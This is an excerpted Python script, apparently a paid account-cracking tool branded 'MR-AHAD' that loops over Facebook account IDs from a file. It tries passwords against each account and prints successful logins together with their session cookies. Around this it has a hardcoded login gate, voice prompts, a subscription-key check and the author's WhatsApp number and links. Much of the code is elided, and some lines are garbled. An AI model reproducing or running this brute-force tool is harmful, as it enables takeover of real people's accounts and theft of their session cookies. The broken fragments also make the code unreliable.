...
import requests,bs4,json,os,sys,random,dat Console as sol
...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mAhad')
...
for x in range(10):
	...
	i2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
...
while attemps < 12345677901:
    ...
    if username == 'V' and password == '10':
        print(' \033[0;92mYou Have Successfully Logged in.')
        os.system('espeak -a 300 " Logged, in, Successfully, Sir,"')
        break
    else:
...
os.system('espeak -a 300 " Welcome,   to,  MR-AHAD,  World"')
os.system('xdg-open https://www.facebook.com/zahidulislam.bilash')
def banner():
	os.system("clear")
	print (f"""
<!-- ++----------------------------------------------------------++ -->
...
<!-- ++----------------------------------------------------------++ -->                                                                    
\033[0;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                         \033[0;94m ONLY MOBILE DATA WORKING 
\033[0;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
              \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
              [Author                   • \33[1;38mMR-AHAD ]\33[1;38m         ║\033[1;31m 
              [Facebook                 • MR-AHAD]          ║  \033[1;97m  
              [Github                   • \33[1;38mMR-AHAD-444 ]     ║\33[1;34m   
              [Whatsapp                 • 01927519816 ]     ║\33[1;35m 
              [TOOLS                    • Paid  ]           ║ \33[1;32m   
              [VERSION                  • 4.1 ]             ║\033[1;35m 
              \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
...
def login():
	...
	TUTULj('\033[0;97m===============================================')
	AHAD= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if AHAD in ['m']:
		public()
	elif AHAD in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+8801927519816')
	elif AHAD in ['0']:
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN METHOD\n\x1b[1;97m [1] FILE METHOD ')
	os.system('espeak -a 300 " 1,  method,  File"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[MR-AHAD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#MR-AHAD
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•MR-AHAD-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " MR-AHAD,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m MR-AHAD, ToOLs Daily Update")
		...
		os.system('am start https://wa.me/+8801927519816?text=' + tks)
		Subscraption() 
login()
